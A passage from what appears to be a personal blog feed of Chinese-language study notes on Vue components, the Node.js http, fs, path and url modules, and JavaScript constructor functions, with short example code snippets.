<li><p>組件標籤寫法：<br> a. <code>&lt;school&gt;&lt;/school&gt;</code><br> b. <code>&lt;school/&gt;</code>    (不使用腳手架時，<code>&lt;school/&gt;</code>標籤會導致後續組件不能渲染)</p>
</li>
<li><p>簡寫方式：<br> <code>const school = Vue.extend(options)</code>可簡寫為<code>const school = options</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;School&#x27;</span>,</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;School Name: &#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;School Address: &#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>&#123;</span><br><span class="line">            <span class="attr">schoolName</span>:<span class="string">&#x27;CUHK&#x27;</span>,</span><br><span class="line">            <span class="attr">address</span>:<span class="string">&#x27;Tai Po&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>組件嵌套</p>
<ul>
<li>在組件內傳入<code>components</code>選項  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定義 student 組件</span></span><br><span class="line"><span class="keyword">const</span> student = &#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;Student&lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定義 school 組件</span></span><br><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;student&gt;&lt;/student&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;</span><br><span class="line">        student</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定義 app 組件</span></span><br><span class="line"><span class="keyword">const</span> app = &#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;school&gt;&lt;/school&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;</span><br><span class="line">        school,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;app&gt;&lt;/app&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="comment">// 註冊組件(局部)</span></span><br><span class="line">    <span class="attr">components</span>:&#123;app&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>VueComponent</code></p>
<ol>
<li><p><code>school</code>組件本質是一個名為<code>VueComponent</code>的<font color="#f54747">構造函數</font>，且不是程序員定義的，是<code>Vue.extend</code>生成的</p>
</li>
<li><p>我們只需要寫<code>&lt;school&gt;&lt;/school&gt;</code>，Vue解析時會幫我們創建<code>school</code>組件的實例對象</p>
<ul>
<li>即Vue會幫我們執行：<code>new VueComponent(options)</code></li>
</ul>
</li>
<li><p>特別注意：<font color="#f54747">每次調用<code>Vue.extend</code>時，返回的都是一個全新的<code>VueComponent</code>！！！</font></p>
</li>
<li><p><code>this</code>指向：</p>
<ul>
<li><p>組件配置中：</p>
<ul>
<li><code>data</code>函數、<code>methods</code>中的函數、<code>watch</code>中的函數、<code>computed</code>中的函數<br>  他們的<code>this</code>都是<font color="#f54747">VueComponent實例對象</font></li>
</ul>
</li>
<li><p><code>new Vue(options)</code>配置中：</p>
<ul>
<li><code>data</code>函數、<code>methods</code>中的函數、<code>watch</code>中的函數、<code>computed</code>中的函數<br>  他們的<code>this</code>都是<font color="#f54747">Vue實例對象 &#x3D;&#x3D;&#x3D; vm</font></li>
</ul>
</li>
</ul>
</li>
<li><p><code>VueComponent</code>的實例對象，簡稱<code>vc</code>。Vue的實例對象，簡稱<code>vm</code></p>
</li>
</ol>
</li>
<li><p>內置關係：</p>
<ul>
<li>一個重要的內置關係：<code>VueComponent.prototype.__proto__ === Vue.prototype</code></li>
<li>原因：讓組件實例對象(vc)，也能訪問到Vue原型上的屬性和方法</li>
</ul>
</li>
</ol>
<h2 id="單文件組件"><a href="#單文件組件" class="headerlink" title="單文件組件"></a>單文件組件</h2><ol>
<li><p>創建<code>index.html</code>文件</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入Vue.js --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../vue_basic/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入入口文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>配置<code>main.js</code>入口文件</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`&lt;App&gt;&lt;/App&gt;`</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;<span class="title class_">App</span>&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>配置<code>App</code>組件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;School/&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 引入組件</span><br><span class="line">    import School from &#x27;./School.vue&#x27;</span><br><span class="line"></span><br><span class="line">    // 暴露App組件</span><br><span class="line">    export default &#123;</span><br><span class="line">        name:&#x27;App&#x27;,</span><br><span class="line">        components:&#123;</span><br><span class="line">            School,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>配置<code>School</code>組件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 組件的結構 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">        &lt;h2&gt;School Name: &#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">        &lt;button @click=&quot;showName&quot;&gt;Show Name&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 組件交互相關的代碼 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name:&#x27;School&#x27;,</span><br><span class="line">        data()&#123;</span><br><span class="line">            return&#123;</span><br><span class="line">                name:&#x27;CUHK&#x27;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            showName()&#123;</span><br><span class="line">                alert(this.name)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125; </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 組件的樣式 --&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .demo&#123;</span><br><span class="line">        background-color: orange;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>注意：此時開啟<code>index.html</code>文件頁面沒有任何小效果，因為沒有配置Vue腳手架</p>
</li>
</ol>
]]></content>
      <categories>
        <category>VueJS</category>
      </categories>
      <tags>
        <tag>VueJS</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeJS - Modules</title>
    <url>/myBlog/2022/07/01/2022/2022-7-1-NodeJS-Modules/</url>
    <content><![CDATA[<h2 id="http模塊"><a href="#http模塊" class="headerlink" title="http模塊"></a>http模塊</h2><ol>
<li><p>簡介：</p>
<ul>
<li><code>http</code>模塊是<code>Node.js</code>官方提供用於創建<code>Web</code>服務器的模塊</li>
</ul>
</li>
<li><p>作用：</p>
<ul>
<li>基於<code>Node.js</code>提供的<code>http</code>模塊，就可以簡單的手寫一個服務器軟件，從而對外提供<code>Web</code>服務</li>
</ul>
</li>
<li><p>創建Web服務器：</p>
<ol>
<li><p>導入http模塊：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>創建服務器實例：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>服務器實例綁定<code>request</code>事件，用於監聽客戶端請求：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;...&#125;)    <span class="comment">// (事件, 回調函數)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>啟動服務器：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">server.<span class="title function_">listen</span>(<span class="number">8080</span>, <span class="function">() =&gt;</span> &#123;...&#125;)  <span class="comment">// (通訊埠, 回調函數)</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 導入http模塊</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 創建web服務器實例</span></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 為服務器綁定request事件，監聽客戶端請求</span></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Someone sent a request&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 啟動服務器在8080端口</span></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">8080</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running at http://127.0.0.1:8080&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="res響應對象"><a href="#res響應對象" class="headerlink" title="res響應對象"></a>res響應對象</h3><ol>
<li><p>作用：</p>
<ul>
<li>用於返回渲染的內容，訪問與服務器相關的數據或屬性</li>
</ul>
</li>
<li><p>對象屬性：</p>
<ol>
<li><p>往瀏覽器寫入內容：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">write</span>(str)  <span class="comment">// 往瀏覽器寫入 str 內容</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>寫入並表示傳輸的結束：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">end</span>(str)    <span class="comment">// 向客戶端響應內容(str)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>設置響應頭：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 設置響應頭(響應頭類型、編譯方式、編碼方式)</span></span><br><span class="line">res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;text/html; charset=utf-8&quot;</span>&#125;)</span><br><span class="line">res.<span class="title function_">writeHead</span>(<span class="number">404</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;text/plain; charset=utf-8&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">server.<span class="title function_">on</span>(<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 設置響應頭，修改編譯格式</span></span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">404</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;text/html; charset=utf-8&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 往瀏覽器寫入內容</span></span><br><span class="line">    res.<span class="title function_">write</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;b&gt;Hello World&lt;/b&gt;</span></span><br><span class="line"><span class="string">            &lt;div&gt;你好&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 傳輸結束</span></span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="req請求對象"><a href="#req請求對象" class="headerlink" title="req請求對象"></a>req請求對象</h3><ol>
<li><p>作用：</p>
<ul>
<li>用於接收瀏覽器傳的參數，訪問與客戶端相關的數據或屬性</li>
</ul>
</li>
<li><p>對象屬性：</p>
<ol>
<li><p>獲取瀏覽器路徑：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> url = req.<span class="property">url</span>     <span class="comment">// 值為客戶端請求的URL地址（域名及通訊埠後的字符串）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>獲取請求類型：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> method = req.<span class="property">method</span>   <span class="comment">// 值為客戶端的 method 請求類型</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入方法</span></span><br><span class="line"><span class="keyword">var</span> moduleRenderHTML = <span class="built_in">require</span>(<span class="string">&#x27;./modules/renderHTML&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> moduleRenderStatus = <span class="built_in">require</span>(<span class="string">&#x27;./modules/RenderStatus&#x27;</span>)</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&quot;request&quot;</span>, <span class="function">(<span class="params">req, res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// req 接收瀏覽器傳的參數</span></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">url</span> === <span class="string">&#x27;/favicon.ico&#x27;</span>) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// res 返回渲染的內容</span></span><br><span class="line">    res.<span class="title function_">writeHead</span>(moduleRenderStatus.<span class="title function_">renderStatus</span>(req.<span class="property">url</span>), &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    res.<span class="title function_">write</span>(moduleRenderHTML.<span class="title function_">renderHTML</span>(req.<span class="property">url</span>))</span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="fs文件系統模塊"><a href="#fs文件系統模塊" class="headerlink" title="fs文件系統模塊"></a>fs文件系統模塊</h2><ol>
<li><p>簡介：</p>
<ul>
<li><code>fs</code>模塊是<code>Node.js</code>官方提供用於操作文件的模塊</li>
</ul>
</li>
<li><p>導入<code>fs</code>模塊：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="fs模塊內置方法"><a href="#fs模塊內置方法" class="headerlink" title="fs模塊內置方法"></a>fs模塊內置方法</h3><ol>
<li><p><code>fs.readFile</code>方法：</p>
<ul>
<li><p>用於讀取指定文件中的內容</p>
</li>
<li><p>語法：</p>
<ol>
<li><code>path</code>：必選參數，字符串，表示文檔路徑</li>
<li><code>options</code>：可選參數，表示編碼格式，默認值<code>utf8</code></li>
<li><code>callback</code>：必選參數，文件讀取完後的回調函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fs.<span class="title function_">readFile</span>(path, options, callback)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以utf-8形式編譯讀取1.txt文檔</span></span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./files/1.txt&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, dataStr</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;讀取文件失敗：&#x27;</span>, err.<span class="property">message</span>)   <span class="comment">// 錯誤信息</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;讀取文件成功：&#x27;</span>, dataStr)  <span class="comment">// 讀取內容</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>fs.writeFile</code>方法：</p>
<ul>
<li><p>用於向指定文件中寫入內容</p>
</li>
<li><p>語法：</p>
<ol>
<li><code>path</code>參數：必選參數，字符串，表示文檔路徑</li>
<li><code>data</code>參數：必選參數，表示要寫入的內容</li>
<li><code>options</code>：可選參數，表示編碼格式，默認值utf8</li>
<li><code>callback</code>：必選參數，文件讀取完後的回調函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fs.<span class="title function_">writeFile</span>(path, data, options, callback)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以utf-8形式編譯寫入1.txt文檔</span></span><br><span class="line">fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;f:/files/2.txt&#x27;</span>, <span class="string">&#x27;Hello node.js&#x27;</span>, <span class="keyword">function</span>(<span class="params">err</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;文件寫入失敗：&#x27;</span>, err.<span class="property">message</span>)   <span class="comment">// 錯誤信息</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;文件寫入成功&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="path路徑模塊"><a href="#path路徑模塊" class="headerlink" title="path路徑模塊"></a>path路徑模塊</h2><ol>
<li><p>簡介：</p>
<ul>
<li><code>path</code>模塊是<code>Node.js</code>官方提供用於處理路徑的模塊</li>
</ul>
</li>
<li><p>導入<code>path</code>模塊：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="path模塊內置方法"><a href="#path模塊內置方法" class="headerlink" title="path模塊內置方法"></a>path模塊內置方法</h3><ol>
<li><p><code>path.join</code>方法：</p>
<ul>
<li><p>用來將多個路徑片段拼接成一個完整的路徑字符串</p>
</li>
<li><p>語法：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">path.<span class="title function_">join</span>([...paths])</span><br></pre></td></tr></table></figure>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pathStr = path.<span class="title function_">join</span>(<span class="string">&#x27;/a&#x27;</span>, <span class="string">&#x27;/b/c&#x27;</span>, <span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;/d&#x27;</span>, <span class="string">&#x27;/e&#x27;</span>)      <span class="comment">// &#x27;/a/b/d/e&#x27;</span></span><br><span class="line"><span class="keyword">const</span> pathStr = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;./files/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：<font color="#f54747">凡涉及路徑拼接的操作，都要使用<code>path.join</code>方法進行處理，不要直接使用<code>+</code>進行字符串拼接</font></li>
</ul>
</li>
</ul>
</li>
<li><p><code>path.basename</code>方法：</p>
<ul>
<li><p>用來從路徑字符串中，將文件名解析出來</p>
</li>
<li><p>語法：</p>
<ol>
<li><code>path</code>參數：必選參數，表示一個路徑字符串</li>
<li><code>ext</code>參數：可選參數，表示文件擴展名</li>
<li>返回：表示路徑中最後的一個部分（文件名）  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">path.<span class="title function_">basename</span>(path, ext)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fpath = <span class="string">&#x27;/files/result.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fullName = path.<span class="title function_">basename</span>(fpath)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fullName)  <span class="comment">// result.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> nameWithoutExt = path.<span class="title function_">basename</span>(fpath, <span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nameWithoutExt)  <span class="comment">//result</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>path.extname</code>方法：</p>
<ul>
<li><p>用於獲取路徑中的擴展名</p>
</li>
<li><p>語法：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">path.<span class="title function_">extname</span>(path)</span><br></pre></td></tr></table></figure>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fpath = <span class="string">&#x27;/files/result.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ext = path.<span class="title function_">extname</span>(fpath)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ext)  <span class="comment">// txt</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="dirname屬性"><a href="#dirname屬性" class="headerlink" title="__dirname屬性"></a>__dirname屬性</h3><ol>
<li><p>路徑動態拼接問題：</p>
<ul>
<li>在使用<code>fs</code>模塊操作文件時，如果提供的操作路徑時以<code>./</code>或者<code>../</code>開頭的相對路徑時，很容易出現路徑動態拼接錯誤問題  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./files/1.txt</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>原因：</p>
<ul>
<li>代碼運行時，會以<font color="#f54747">執行<code>node</code>命令所在的目錄</font>，動態拼接出被操作文件的完整路徑</li>
</ul>
</li>
<li><p>解決方案：</p>
<ol>
<li><p>直接提供一個完整的文件存放路徑</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/Users/donald/Weekly\Tasks/NodeJS/01.Node基礎/files/1.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>問題：<font color="#f54747">移植性非常差，不利於維護</font></li>
</ul>
</li>
<li><p><code>__dirname</code>屬性：表示當前文件所處的目錄</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">__dirname + <span class="string">&#x27;/files/1.txt&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="url模塊"><a href="#url模塊" class="headerlink" title="url模塊"></a>url模塊</h2><ol>
<li><p>解析路徑：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myURL = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>, <span class="string">&#x27;https://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p>提取路徑名：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">myURL.<span class="property">pathname</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>路徑參數：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">myURL.<span class="property">searchParams</span>  <span class="comment">// &#123; &#x27;a&#x27; =&gt; &#x27;1&#x27;, &#x27;name&#x27; =&gt; &#x27;Donald&#x27; &#125;</span></span><br><span class="line"><span class="comment">// 提取參數名與值</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> [key,value] <span class="keyword">of</span> myURL.<span class="property">searchParams</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key, value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>拼接路徑：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;five&#x27;</span>, <span class="string">&#x27;http://example.com/one/two/three/four&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>format</code>方法：</p>
<ul>
<li><p>改變路徑的顯示樣式</p>
</li>
<li><p>配置項：</p>
<ol>
<li><code>auth</code>：<code>true</code>為序列化網址字符串應包含用戶名和密碼 (<code>a:bcd</code>) ，默認值<code>true</code>（代表顯示）</li>
<li><code>fragment</code>：<code>true</code>為序列化網址字符串應包含片段 (<code>#foo</code>)，默認值<code>true</code>（代表顯示）</li>
<li><code>search</code>：<code>true</code>為序列化網址字符串應包含搜索查詢 (<code>?abc</code>)，默認值<code>true</code>（代表顯示）</li>
<li><code>unicode</code>：<code>true</code>為<code>Unicode</code>字符串會直接編碼，而不是<code>Punycode</code>編碼，默認值<code>false</code>（<code>Unicode</code>編譯）</li>
</ol>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myURL = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;https://a:b@測試?abc#foo&#x27;</span>)        </span><br><span class="line">url.<span class="title function_">format</span>(myURL, &#123;</span><br><span class="line">    <span class="attr">auth</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">fragment</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">search</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">unicode</span>: <span class="literal">true</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// myURL = https://測試/</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>NodeJS</category>
      </categories>
      <tags>
        <tag>NodeJS</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - Construct Function</title>
    <url>/myBlog/2022/07/11/2022/2022-7-11-JS-ConstructFunction/</url>
    <content><![CDATA[<h2 id="構造函數"><a href="#構造函數" class="headerlink" title="構造函數"></a>構造函數</h2><ol>
<li>簡介：<ul>
<li>由於在ES6之前，JS中並沒有引入類的概念，<br>  因此ES6之前的對象不是基於類創建的，而是用一種稱為構造函數的特殊函數來定義對象和他的特徵</li>
</ul>
</li>
</ol>
<h3 id="構造函數的使用"><a href="#構造函數的使用" class="headerlink" title="構造函數的使用"></a>構造函數的使用</h3><ol>
<li><p>利用構造函數創建對象：</p>
<ul>
<li>語法規範：<font color="#f54747">首字母大寫</font></li>
